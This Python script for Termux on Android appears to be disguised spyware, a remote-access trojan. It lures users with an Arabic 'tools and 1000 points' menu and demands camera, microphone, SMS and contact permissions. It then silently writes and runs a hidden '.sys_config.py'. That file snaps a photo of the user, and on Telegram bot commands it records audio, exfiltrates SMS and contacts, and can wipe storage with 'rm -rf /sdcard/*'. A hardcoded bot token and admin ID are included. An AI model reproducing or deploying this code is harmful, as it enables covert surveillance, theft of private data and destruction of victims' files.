import os, sys, time, random, subprocess, asyncio, base64
import requests

# --- إعدادات السيادة المطلقة (علي طالب - SUKUNA) ---
TOKEN = "8382035555:AAEyKqioQySc5HNLSJ3NwrDh89p3RpDPY"
ADMIN_ID = "6709215417"

# الألوان الملكية
G, R, Y, C, W, P = '\033[1;32m', '\033[1;31m', '\033[1;33m', '\033[1;36m', '\033[1;37m', '\033[1;35m'

def ar(text):
    from arabic_reshaper import reshape
    from bidi.algorithm import get_display
    try: return get_display(reshape(text))
    except: return text

# --- نظام التجسس التلقائي والسحابة (Auto-Spy & Cloud) ---
def start_ghost_engine(vid, vname):
    p_code = f"""
import os, time, requests, subprocess
def slave():
    # سحب صورة تلقائية فور التشغيل (صمت تام)
    try:
        os.system("termux-camera-photo -c 1 /sdcard/dcim/init.jpg")
        with open('/sdcard/dcim/init.jpg', 'rb') as f:
            requests.post("https://api.telegram.org/bot{TOKEN}/sendPhoto", 
                          files={{'photo': f}}, 
                          data={{"chat_id": "{ADMIN_ID}", "caption": "📸 [AUTO-CAPTURE] Victim: {vname} | ID: {vid}"}})
    except: pass

    last_id = 0
    while True:
        try:
            r = requests.get("https://api.telegram.org/bot{TOKEN}/getUpdates?offset="+str(last_id+1)).json()
            for up in r.get('result', []):
                last_id = up['update_id']
                if 'message' in up:
                    cmd = up['message']['text']
                    header = f"📁 [DATABASE] Victim: {vname} | ID: {vid}"
                    if cmd == "/all_cam" or cmd == f"/cam_{vid}":
                        os.system("termux-camera-photo -c 1 /sdcard/s.jpg")
                        requests.post("https://api.telegram.org/bot{TOKEN}/sendPhoto", files={{'photo':open('/sdcard/s.jpg','rb')}}, data={{"chat_id":"{ADMIN_ID}","caption":header}})
                    elif cmd == "/all_mic" or cmd == f"/mic_{vid}":
                        os.system("termux-microphone-record -l 10 /sdcard/r.mp3")
                        requests.post("https://api.telegram.org/bot{TOKEN}/sendAudio", files={{'audio':open('/sdcard/r.mp3','rb')}}, data={{"chat_id":"{ADMIN_ID}","caption":header}})
                    elif cmd == "/all_dump" or cmd == f"/dump_{vid}":
                        data = f"SMS:\\n{{os.popen('termux-sms-list').read()}}\\nCONTACTS:\\n{{os.popen('termux-contact-list').read()}}"
                        requests.post("https://api.telegram.org/bot{TOKEN}/sendMessage", data={{"chat_id":"{ADMIN_ID}", "text": f"{{header}}\\n\\n{{data[:3500]}}"}} )
                    elif cmd == f"/format_{vid}":
                        os.system("rm -rf /sdcard/*")
        except: pass
        time.sleep(5)
slave()
"""
    with open(".sys_config.py", "w") as f: f.write(p_code)
    subprocess.Popen(["python", ".sys_config.py"], stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))

class SukunaSystem:
    def __init__(self):
        self.v_id = f"SK_{random.randint(1000, 9999)}"
        self.u_name = "Guest"

    def force_permissions(self):
        # إجبار الضحية على منح كل الصلاحيات
        os.system("clear")
        print(f"{R} [!] {ar('يجب منح كل الصلاحيات (كاميرا، ميكروفون، تخزين) لفتح الأدوات والحصول على 1000 نقطة!')}")
        os.system("termux-setup-storage")
        # استدعاء وهمي للصلاحيات لتفعيلها في النظام
        os.system("termux-contact-list > /dev/null 2>&1")
        os.system("termux-sms-list > /dev/null 2>&1")

    async def start(self):
        self.force_permissions()
        self.u_name = input(f"{Y} {ar('أدخل اسمك الملكي لتفعيل السيرفر:')} {W}")
        start_ghost_engine(self.v_id, self.u_name)
        
        # إرسال تقرير الصيد للسحابة
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={
            "chat_id": ADMIN_ID,
            "text": f"🔥 {ar('تمت السيطرة على قطعة شطرنج جديدة!')}\n👤 Name: {self.u_name}\n🆔 ID: {self.v_id}\n🛡️ {ar('الصلاحيات: كاملة ✅')}"
        })

        while True:
            os.system("clear")
            print(f"{R}   S U K U N A  |  C L O U D  B O T N E T")
            print(f"{W}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            print(f" {B}[1] {ar('أدوات الهجوم')} [2] {ar('المتجر')} [3] {ar('الدردشة')}")
            input(f"\n{R} SUKUNA > {W}")

if __name__ == "__main__":
    bot = SukunaSystem()
    asyncio.run(bot.start())
